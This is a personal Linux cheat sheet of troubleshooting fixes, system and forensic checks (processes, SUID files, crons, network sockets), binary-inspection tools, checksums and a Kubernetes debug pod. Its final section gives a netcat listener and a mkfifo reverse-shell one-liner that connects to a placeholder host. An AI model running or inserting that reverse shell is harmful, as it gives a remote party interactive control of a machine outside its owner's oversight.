...

## **error:25066067:DSO support routines:dlfcn_load:could not load the shared library**

tmp fix: `export OPENSSL_CONF=/dev/null`

`export TERM=xterm-256color`

"eval `ssh-agent` && ssh-add"


## Load snaps profile

`sudo apparmor_parser -r /var/lib/snapd/apparmor/profiles/*`

## Checks

### System
- `ps -ef`
- `top -p PID`
- `uname -a; env; history`
- `systemctl list-unit-files`
- `tail -f /var/log/messages`
- `find / -mtime -7`
- `find / -type f -mmin -60`
- `nmap -sT -v localhost`
- `find /dir -executable -type f`

### Who
`who; w; last`

### Super users
`grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'`

### SUID / GUID
- `find / -perm -u=s -type f 2>/dev/null`
- `find / -type f -perm -04000 2> /dev/null`
- `find / -type f -perm -02000 2> /dev/null`

### Net status
- `ss -antup; lsof -i`
- `netstat -anp`

### List crons
`crontab -l; ls -la /etc/cron*`

### history

`~/.bash_history`

### Create file

`dd if=/dev/zero of=foobar.txt bs=1M count=<number_of_megabytes>`

### Random string

`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 23 | head -n 1`

### rm

`find ./ -type f -name "*.json" -exec rm -f {} \;`

## Commands
```shell
strace # Display the system calls and signals of a specific program
lsof # List open files (process)
stat # Display file or file system status
modinfo # Show information about a Linux Kernel module
modprobe # Add and remove modules from the Linux Kernel
lsmod # Show the status of modules in the Linux Kernel
dmesg # Print or control the kernel ring buffer (logs)
watch # Execute a program periodically, showing output fullscreen
xxd # Make a hexdump or do the reverse
readelf # Display information about ELF files
objdump # Display information from object files
strings # Display text strings embedded in binary
exiftool # Show/Remove files metadata
```

### md5sum

```sh
find . -type f ! -name checksums.md5 -exec md5sum {} + > checksums.md5
md5sum -c checksums.md5
```

### pod debug
```sh
kubectl run pod-debug --rm -i --tty --image alpine:latest -- /bin/sh
#apk --update add <package>
```

### -1

`nc -lvp 4444`
```sh
mkfifo /tmp/fifo
sh -i < /tmp/fifo 2>&1 | nc IP_LISTENER 4444 > /tmp/fifo
```
